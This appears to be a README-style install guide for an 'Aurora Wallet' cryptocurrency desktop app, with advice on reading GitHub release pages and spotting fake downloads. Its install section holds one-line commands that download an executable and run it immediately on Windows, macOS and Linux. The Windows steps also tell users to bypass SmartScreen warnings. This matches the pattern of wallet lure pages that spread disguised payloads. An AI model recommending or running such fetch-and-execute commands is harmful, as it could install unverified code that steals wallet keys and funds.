![Aurora Wallet github releases guide](assets/aurora-wallet-guide-article-banner.png)

# Aurora Wallet GitHub releases: how to read the release page

Where the installers, the notes and the checksums live, and which file belongs on your machine.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


The release page of the wallet repository is the only place where a download and its checksum appear together.

Every Aurora Wallet version is published as a tagged release. The tag names the version, the notes describe the change, and the assets below the notes hold one file per operating system. Reading that page correctly is the difference between installing the wallet and installing something that claims to be it.

<!-- ARTICLE-BODY-BEGIN -->

## What the page contains

The notes at the top describe what changed, which fixes matter and whether a version is a normal update. Below the notes, the assets list holds the installers: an `.exe` for Windows, a `.dmg` for macOS and a `.zip` archive for Linux, plus the checksum values in the body of the notes.

The release is public. No account is needed to read it, and no account is needed to download from it.

## Pick the file for your system

1. Read the tag at the top to confirm the version you are installing.
2. Scroll to the assets list and choose the file that matches your operating system.
3. Note the size of the file so you can tell an interrupted download from a complete one.
4. Compare the SHA-256 value in the notes with the file you received.
5. Keep the release page open while you install, so you can return to it if a step needs a second file.

The mapping is simple: `.exe` on Windows, `.dmg` on macOS, `.zip` on Linux. Installing the wrong one produces an error at the first click, and nothing worse.

## Reading notes before you install

Notes earn their place when a version changes something you rely on: a wallet format step, a network change or a fix for a symptom you are living with. Skim the fixes section, then check the requirements line to confirm your system is still supported.

Updating from an older version is covered by <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/09-update-aurora-wallet-safely.md">updating Aurora Wallet safely</a>, and the current download page is the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">latest Aurora Wallet release</a>.

A release page that asks you to log in, promises a bonus or offers a file for a system you do not have is not this page. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/10-spot-fake-wallet-downloads.md">Fake wallet downloads</a> lists the patterns those pages use.

## FAQ

### Do pre-releases appear on the same page?

They appear as separate entries marked pre-release. Unless you are testing a build on purpose, install the newest normal release.

### Can I download an older version on purpose?

Yes, older releases stay listed. Installing an old build to read a note is fine; running an old build to hold funds is not, because it misses every later fix.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Verify SHA-256 checksums](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/06-verify-sha256-checksums.md)
- [Update Aurora Wallet safely](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/09-update-aurora-wallet-safely.md)
- [Spot fake wallet downloads](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/10-spot-fake-wallet-downloads.md)
- [Release 2026.08.1.0 details](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/08-release-2026-08-1-0.md)
